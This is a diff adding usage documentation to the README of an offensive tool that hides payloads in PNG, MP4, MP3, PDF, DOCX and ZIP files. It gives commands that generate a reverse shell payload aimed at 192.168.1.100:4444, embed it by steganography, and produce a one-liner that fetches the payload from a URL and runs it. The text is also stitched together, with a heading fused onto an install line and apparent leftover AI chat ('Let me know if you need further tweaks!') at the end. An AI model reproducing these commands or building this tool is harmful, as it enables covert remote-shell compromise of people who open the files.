@@ -29,3 +29,87 @@ The following dependencies are required to run this project:
 
 ```bash
 sudo apt-get install steghide exiftool ffmpeg unzip# Steganography-hidden-payload
+
+
+Usage
+
+Inject a Reverse Shell Payload into a PNG Image using Steganography:
+
+python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -s
+
+This command generates a reverse shell payload and hides it inside the image.png file using steganography.
+
+Inject a Payload into Media File Metadata:
+
+python hide-a-payload.py -p "Your custom payload here" -f video.mp4
+
+This command injects a custom payload into the metadata of video.mp4.
+
+Extract a Payload from a Media File:
+
+python hide-a-payload.py -x -f image.png
+
+This command extracts the payload hidden in the image.png file.
+Generate a One-Liner for Payload Extraction:
+
+python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -u http://example.com
+
+You will be prompted to select the type of one-liner to generate for extracting and executing the payload.
+
+Supported Media Types
+
+The tool currently supports the following media formats for payload injection and extraction:
+
+Images: PNG, JPG, JPEG
+
+Videos: MP4
+
+Audio: MP3
+
+Documents: PDF, DOCX
+
+Archives: ZIP
+
+
+Command-Line Options
+
+-p or --payload: Specify the payload type (e.g., reverse_shell or custom payload).
+
+-i or --ip: IP address for reverse shell payload.
+
+-r or --port: Port for reverse shell payload.
+
+-f or --file: Specify the media file for payload injection or extraction.
+
+-s or --steganography: Use steganography for payload injection.
+
+-x or --extract: Extract payload from a media file.
+
+-b or --base64: Base64 encode the generated payload.
+
+-c or --check: Check if a media file is compatible for payload injection.
+
+
+Example Usage:
+
+Inject a Reverse Shell Payload into a PNG Image using Steganography
+
+python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -s
+
+Extract a Payload from a PNG Image
+
+python hide-a-payload.py -x -f image.png
+
+Generate a One-Liner for Reverse Shell Payload Extraction
+
+python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f video.mp4 -u http://example.com
+
+License
+
+This project is licensed under the MIT License.
+
+Acknowledgements
+
+Special thanks to rMETASHELL for the idea and inspiration behind this project. Their work laid the foundation for this dynamic media-based payload injection and extraction tool.
+
+This `README.md` should cover all aspects of your project, including installation, usage, and a special acknowledgment to **rMETASHELL** for the idea. Let me know if you need further tweaks!
